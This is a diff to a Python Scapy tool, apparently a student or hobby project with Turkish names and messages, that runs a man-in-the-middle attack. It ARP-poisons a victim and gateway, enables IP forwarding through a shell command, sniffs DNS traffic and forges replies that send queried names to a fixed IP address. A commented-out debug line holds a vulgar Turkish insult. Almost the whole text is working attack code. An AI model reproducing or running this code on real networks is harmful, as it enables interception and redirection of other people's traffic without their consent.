@@ -10,9 +10,10 @@ import platform
 
 
 def dnspaket(paket):
-    if paket.haslayer(DNS) and paket.getlayer(DNS).qr == 0:
-        log(paket.show())
-        log(paket.haslayer(DNSRR))
+    if paket.haslayer(DNS) and paket.getlayer(DNS).qr == 1:
+
+        print(paket.show())
+        print(paket.haslayer(DNSRR))
         ip = paket.getlayer(IP)
         sorgu = paket.getlayer(DNS)
         kaynakip = paket[IP].src
@@ -20,14 +21,13 @@ def dnspaket(paket):
         kaynakport = paket[UDP].sport
         hedefport = paket[UDP].dport
         sorguadi = sorgu.qd.qname
+
         cevap = IP(dst=kaynakip, src=hedefip) / UDP(dport=ip.sport, sport=ip.dport) / DNS(id=sorgu.id, qr=1,
                                                                                           qd=sorgu.qd,
                                                                                           an=DNSRR(rrname=sorguadi,
                                                                                                    ttl=10,
-                                                                                                   rdata="172.16.103"
-                                                                                                         ".249"))
-        log(sorguadi)
-        log(cevap)
+                                                                                                   rdata="216.92.154.97"))
+
         send(cevap)
 
 def port_forwarding(flag=1):
@@ -40,7 +40,7 @@ def port_forwarding(flag=1):
     if platform.system() == LINUX:
         # case we deal with linux os
         log('echo 1 ip_forward öncesi')
-        # os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
+        os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
         # os.system('echo ' + flag + ' | sudo tee /proc/sys/net/ipv4/ip_forward')
         log('echo 1 ip_forward sonrası')
     elif platform.system() == OSX:
@@ -73,8 +73,8 @@ def done(ip, r, interface):
     log('Restoring Targets...')
     victim_mac = get_mac(ip, interface)
     gate_mac = get_mac(r, interface)
-    send(ARP(op=2, pdst=r, psrc=ip, hwdst=MAC_ADDRESS_CLEAN_PATTERN, hwsrc=victim_mac), count=7)
-    send(ARP(op=2, pdst=ip, psrc=r, hwdst=MAC_ADDRESS_CLEAN_PATTERN, hwsrc=gate_mac), count=7)
+    send(ARP(op=2, pdst=r, psrc=ip, hwdst=gate_mac, hwsrc=victim_mac), count=7)
+    send(ARP(op=2, pdst=ip, psrc=r, hwdst=victim_mac, hwsrc=gate_mac), count=7)
     log('Disabling IP Forwarding...')
     port_forwarding(0)
     log('Shutting Down...')
@@ -137,10 +137,10 @@ def mitm(ip, r, interface):
     while 1:
         try:
             log('DNS Paket Sniff')
-            sniff(iface="wlp0s20f3", count=1, filter="udp port 53 DEĞİŞECEK", prn=dnspaket)
+            sniff(count=1, iface="wlp0s20f3", filter="udp port 53", prn=dnspaket)
             arp_poison(victim_mac, gate_mac, ip, r, interface)
-            print("OROSPU COCUGU NE ISIN VAR")
-            sleep(1.5)
+            #print("OROSPU COCUGU NE ISIN VAR")
+             #sleep(1.5)
         except KeyboardInterrupt:
             done(ip, r, interface)
             break
